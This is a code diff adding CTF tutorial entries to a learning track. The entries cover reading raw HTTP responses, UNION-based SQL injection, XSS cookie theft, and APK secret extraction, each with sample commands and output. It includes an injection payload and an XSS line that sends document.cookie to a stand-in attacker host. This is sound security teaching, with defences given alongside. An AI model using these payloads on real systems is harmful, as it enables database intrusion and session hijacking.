@@ -259,6 +259,42 @@ export const learn: Record<string, LearnTrack> = {
           read: "Fuzzing found an exposed admin page, a backup and a .git folder — each a lead to chase (and, for the defender, to lock down).",
         },
       },
+      {
+        q: "How do I find a flag hidden in a web response?",
+        a: "The flag is almost always *somewhere in the HTTP response* — just not on the rendered page. Check **View source** (`Ctrl+U`) and the DOM for HTML comments and hidden fields; **DevTools → Network → Response** (or `curl -i`) for **headers** (a custom `X-…` header, a `Set-Cookie`) and for **API/JSON** fields the UI never shows; and the usual exposed spots — `/robots.txt`, `/.git/`, `*.js.map`, backup files. When in doubt, grep the raw response.",
+        worked: {
+          input: "curl -i http://shop.local/            # headers + body\ncurl http://shop.local/api/products | grep -i flag",
+          output: "X-Debug-Flag: HHB{...}\n\"_internal\":{\"secret_flag\":\"HHB{...}\"}",
+          read: "Two flags the page never displayed — one in a response header, one in a JSON field. Always read the raw response, not just the page.",
+        },
+      },
+      {
+        q: "How does SQL injection pull the flag out of the database?",
+        a: "If user input goes straight into a query, you can change the query. First **detect**: add a quote (`id=1'`) — a SQL error means it's injectable. Then **extract** with **UNION**: append your own `SELECT` so its row renders where the app expected data. If the real query selects two columns, you select two, putting the flag (often in a `flags` table) in a visible position. `information_schema` reveals table and column names first if you don't know them. **sqlmap** automates the whole thing. The fix is **parameterised queries**.",
+        worked: {
+          input: "curl \"http://shop.local/item?id=-1 UNION SELECT flag,2 FROM flags-- -\"",
+          output: "<h1>HHB{un10n_b4s3d_sql1}</h1>",
+          read: "id=-1 returns no real row, so the UNION's row shows; `flag` lands in the name's spot and `-- ` comments out the rest. (Enumerate first with `UNION SELECT table_name,2 FROM information_schema.tables`.)",
+        },
+      },
+      {
+        q: "What is XSS, and how is a flag stolen with it?",
+        a: "Cross-site scripting is getting **your JavaScript to run in someone else's browser**, because the app reflects or stores input without encoding it. First confirm: send a marker like `<b>x</b>` and see if it comes back as bold (executed) rather than text. In a CTF the flag is usually the **admin's cookie or a value only they see** — a 'report to admin' bot opens your link, your script runs as them and exfiltrates `document.cookie` to a server you control. Defend by **encoding output** for its context, a **Content-Security-Policy**, and `HttpOnly` cookies.",
+        worked: {
+          input: "curl \"http://shop.local/search?q=<script>document.cookie</script>\"",
+          output: "[report bot] your script executed\n[report bot] exfiltrated cookie: session=HHB{...}",
+          read: "The search echoed input unescaped, so the script ran in the admin's session and leaked their cookie. Real exfil: new Image().src='//you/'+document.cookie.",
+        },
+      },
+      {
+        q: "How do I read an Android app's permissions and secrets?",
+        a: "Decompile the APK — `apktool d app.apk` (resources + manifest) or `jadx -d out/ app.apk` (readable Java) — then read **AndroidManifest.xml**. Permissions are `<uses-permission android:name=\"android.permission.XXX\"/>`; flag over-asking (a shop that wants `READ_SMS`). Also check risky attributes: `usesCleartextTraffic`, `allowBackup`, `debuggable`, and `exported` components. Secrets are often hard-coded in `res/values/strings.xml` or the smali — `grep` for them. **MobSF** does all of this automatically (this is the MAST workflow).",
+        worked: {
+          input: "cat app/AndroidManifest.xml   # or: aapt dump permissions app.apk\ngrep -ri \"api_key\\|secret\\|HHB\" app/res/",
+          output: "<uses-permission android:name=\"android.permission.READ_SMS\"/>\n<application android:usesCleartextTraffic=\"true\" ...>\n<string name=\"api_key\">HHB{...}</string>",
+          read: "An SMS permission a shop doesn't need, cleartext traffic allowed, and an API key baked into the build — all readable by anyone who downloads the APK.",
+        },
+      },
     ],
   },
 
